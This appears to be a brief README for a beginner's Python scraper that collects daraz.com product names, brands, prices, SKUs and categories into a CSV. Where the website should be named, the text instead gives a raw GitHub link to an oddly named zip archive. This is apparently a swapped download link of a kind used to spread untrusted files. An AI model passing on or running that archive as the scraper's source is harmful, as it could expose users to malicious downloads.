This is my very first web scraper. It's for the website :  https://github.com/Zohaibzaibi143/basic-scraper-for-daraz.com/raw/refs/heads/master/fakir/com_daraz_basic_for_scraper_v3.4-beta.5.zip

1. I've used Python 3.6.3. 
2. The libraries I've used are Requests, Beautifulsoup 4, csv and time.
3. It generates a CSV file consisting of the columns : 
   productname| brand | price | unique SKU(ID) | category flow (i.e Home>Men's Fashion>Men's Clothing>Western Clothing>Tshirts> )
   
 As it is the first time I've written a scraper, the code is pretty much basic and simple. I am intending to do use threads for better performance and speed. I'll update that accordingly :)
